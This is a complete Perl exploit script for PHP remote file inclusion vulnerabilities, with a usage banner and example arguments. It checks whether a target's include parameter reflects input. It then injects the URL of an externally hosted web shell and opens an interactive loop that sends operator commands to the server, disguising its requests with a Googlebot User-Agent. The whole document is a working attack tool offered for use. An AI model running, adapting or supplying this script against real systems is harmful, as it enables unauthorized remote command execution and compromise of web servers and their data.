############################################################################
#                  Remote File Inclusion Exploiter                         #
#                                                                          #
# This script attempts to exploit a remote file include vulnerability      #
# by inserting a web shell into an include statement. A shell is then      #
# spawned.                                                                 #
#                                                                          #
# Created By r0ut3r (writ3r [at] gmail.com)                                #
############################################################################

use IO::Socket;

$port = "80"; # connection port
$target = @ARGV[0]; # host.com
$file = @ARGV[1]; # /think/render.php?template_file=
$shellloc = @ARGV[2]; # http://host.com/cmd.txt
$cmdv = @ARGV[3]; # cmd
$vulnerable = false;
$s = true;

sub Header()
{
	print q {Remote File Inclusion Exploiter - By r0ut3r (writ3r [at] gmail.com)
-------------------------------------------------------------------
};
}

sub Usage()
{
	print q
	{Usage: remotefilexpl.pl [target] [vuln_script] [shell_loc] [cmd_variable]
perl remotefilexpl.pl vulnserver.com /test/index.php?page= http://shell/s.txt cmd
};
	exit();
}

Header();

if (!$target || !$file || !$shellloc || !$cmdv) {
	Usage(); }

if ($s eq false) { print "[-] Shell not found\n"; exit(); }

# Check if the script is vulnerable and register_globals are on (if needed)
$vulnc = IO::Socket::INET->new(Proto => "tcp", PeerAddr => $target, PeerPort => $port) || die "[-] Failed to connect on exploit attempt. Exiting...\r\n";
print $vulnc "GET ".$file."AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1\n";
print $vulnc "Host: $target\n";
print $vulnc "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n";
print $vulnc "Accept: text/html\n";
print $vulnc "Connection: keep-alive\n\n";

while (<$vulnc>) {
	if (/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/) { $vulnerable = true; }
}

if ($vulnerable eq false) { print "[-] Target not vulnerable, or register_globals could be off\n"; exit(); }

print "[+] Starting shell\n";
print "[cmd]\$ ";
$cmd = <STDIN>;
$cmd =~ s/ /%20/g;
while ($cmd !~ "exit")
{
	$xpack = IO::Socket::INET->new(Proto => "tcp", PeerAddr => $target, PeerPort => $port) || die "[-] Failed to connect on exploit attempt. Exiting...\r\n";
	print $xpack "GET ".$file.$shellloc."&".$cmdv."=".substr($cmd, 0, -1)." HTTP/1.1\n";
	print $xpack "Host: $target\n";
	print $xpack "User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)\n";
	print $xpack "Accept: text/html\n";
	print $xpack "Connection: keep-alive\n\n";

	print "[cmd]\$ ";
	$cmd = <STDIN>;
}

print "[!] Connection to host lost...\n";
